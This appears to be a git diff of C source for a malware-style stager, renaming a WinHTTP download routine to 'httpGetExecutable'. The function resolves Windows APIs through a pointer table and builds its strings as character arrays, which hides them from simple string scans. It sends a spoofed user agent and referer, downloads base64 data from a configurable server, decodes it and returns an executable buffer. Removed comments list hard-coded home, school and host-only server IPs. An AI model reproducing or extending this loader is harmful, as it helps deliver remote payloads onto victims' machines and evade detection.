@@ -256,31 +256,14 @@ void PostRequest(PAPI api, WCHAR* server, INTERNET_PORT port, const WCHAR* endpo
     ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
 }
 
-LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServer, INTERNET_PORT dwPort)
+LPVOID httpGetExecutable(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServer, INTERNET_PORT dwPort)
 {
     WCHAR wVerb[] = { 'G', 'E', 'T', 0 };
-
-    //WCHAR wEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
-
     WCHAR wUserAgent[] = { 'I', 'm', 'h', 'u', 'l', 'l', 'u', 0 };
-
     WCHAR wVersion[] = { 'H', 'T', 'T', 'P', 0 };
-
     WCHAR wReferer[] = { 'h', 't', 't', 'p', 's', ':', '/', '/', 'g', 'o', 'o', 'g', 'l', 'e', '.', 'c', 'o', 'm', 0 };
-
-    // Home
-    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
-
-    // School
-    //WCHAR wServer[] = { '1', '4', '5', '.', '9', '3', '.', '5', '3', '.', '2', '1', '5', 0 };
-
-    // Host-Only
-    // WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
-
     WCHAR wProxy[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'N', 'A', 'M', 'E', 0 };
     WCHAR wProxyBypass[] = { 'W', 'I', 'N', 'H', 'T', 'T', 'P', '_', 'N', 'O', '_', 'P', 'R', 'O', 'X', 'Y', '_', 'B', 'Y', 'P', 'A', 'S', 'S', 0 };
-
-    DWORD dwEncodedDllSize = 0;
 
     HINTERNET hSession = ((WINHTTPOPEN)api->WinHttpOpen)
     (
@@ -376,8 +359,8 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServ
     }
     #endif
 
-    LPVOID lpContentLength = NULL;
-    DWORD dwBufferLength = 0;
+    LPVOID lpContentLengthBuffer = NULL;
+    DWORD dwContentLengthSize = 0;
     BOOL result = FALSE;
 
     // Calculates the needed buffer length for the content length string if the 4th param is null and returns ERROR_INSUFFICIENT_BUFFER
@@ -387,29 +370,30 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServ
         WINHTTP_QUERY_CONTENT_LENGTH,
         WINHTTP_HEADER_NAME_BY_INDEX,
         NULL,
-        &dwBufferLength,
+        &dwContentLengthSize,
         WINHTTP_NO_HEADER_INDEX
     );
 
     if (((GETLASTERROR)api->GetLastError)() == ERROR_INSUFFICIENT_BUFFER)
     {
         // Allocate the calculated buffer
-        lpContentLength = ((MALLOC)api->malloc)(dwBufferLength/sizeof(WCHAR));
+        lpContentLengthBuffer= ((MALLOC)api->malloc)(dwContentLengthSize/sizeof(WCHAR));
 
         result = ((WINHTTPQUERYHEADERS)api->WinHttpQueryHeaders)
         (
             hRequest,
             WINHTTP_QUERY_CONTENT_LENGTH,
             WINHTTP_HEADER_NAME_BY_INDEX,
-            lpContentLength,
-            &dwBufferLength,
+            lpContentLengthBuffer,
+            &dwContentLengthSize,
             WINHTTP_NO_HEADER_INDEX
         );
     }
 
+    DWORD dwEncodedExecutableSize = 0;
     if (result)
     {
-        dwEncodedDllSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLength);
+        dwEncodedExecutableSize = ((STRTOINTW)api->StrToIntW)((WCHAR*)lpContentLengthBuffer);
     }
     else
     {
@@ -419,21 +403,20 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServ
         #endif
     }
 
-    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedDllSize), (size_t)sizeof(WCHAR));
+    LPVOID lpEncodedBuffer = (LPVOID)((CALLOC)api->calloc)((size_t)(dwEncodedExecutableSize), (size_t)sizeof(WCHAR));
     WCHAR* wcEncodedBuffer = (WCHAR*)lpEncodedBuffer;
-    DWORD bufferIndexChange = 0;
-    DWORD availableBytes = 0;
-    DWORD actuallyRead = 0;
-    LPDWORD lpActuallyRead = &actuallyRead;
+    DWORD dwBytesRead = 0;
+    DWORD dwAvailableBytes = 0;
+    DWORD dwActuallyRead = 0;
   
-    while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &availableBytes) && availableBytes != 0 )
+    while( ((WINHTTPQUERYDATAAVAILABLE)api->WinHttpQueryDataAvailable)(hRequest, &dwAvailableBytes) && dwAvailableBytes != 0 )
     {
         BOOL readSuccess = ((WINHTTPREADDATA)api->WinHttpReadData)
         (
             hRequest,
-            (LPVOID)(wcEncodedBuffer+bufferIndexChange),
-            availableBytes,
-            lpActuallyRead
+            lpEncodedBuffer+dwBytesRead,
+            dwAvailableBytes,
+            &dwActuallyRead
         );
 
         if (!readSuccess)
@@ -445,35 +428,35 @@ LPVOID winHTTPClient(PAPI api, PDWORD pdwDllSize, WCHAR* wEndpoint, WCHAR* wServ
         }
 
         // Check for buffer overflow risk
-        if (bufferIndexChange + (availableBytes / sizeof(WCHAR)) > dwEncodedDllSize / sizeof(WCHAR))
+        if (dwBytesRead + (dwAvailableBytes / sizeof(WCHAR)) > dwEncodedExecutableSize / sizeof(WCHAR))
         { break; }
 
-        bufferIndexChange += availableBytes/sizeof(WCHAR);
+        dwBytesRead += dwAvailableBytes/sizeof(WCHAR);
     }
 
-    *pdwDllSize = base64_raw_size(dwEncodedDllSize);
-    LPVOID lpRawBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));
+    *pdwDllSize = base64_raw_size(dwEncodedExecutableSize);
+    LPVOID lpRawExecutableBuffer = (LPVOID)(((CALLOC)api->calloc)(*pdwDllSize, (size_t)sizeof(CHAR)));
 
     DWORD lengthBuffer = ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
     (
         lpEncodedBuffer,
-        dwEncodedDllSize,
+        dwEncodedExecutableSize,
         0x000000001,
-        lpRawBuffer,
+        lpRawExecutableBuffer,
         pdwDllSize,
         NULL,
         NULL
     );
 
     ((FREE)api->free)(lpEncodedBuffer);
-    ((FREE)api->free)(lpContentLength);
+    ((FREE)api->free)(lpContentLengthBuffer);
 
     ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hRequest);
     ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hConnect);
     ((WINHTTPCLOSEHANDLE)api->WinHttpCloseHandle)(hSession);
 
-    if (lpRawBuffer != NULL && lengthBuffer)
-    { return lpRawBuffer; }
+    if (lpRawExecutableBuffer != NULL && lengthBuffer)
+    { return lpRawExecutableBuffer; }
     else
     { return 0;}
 }
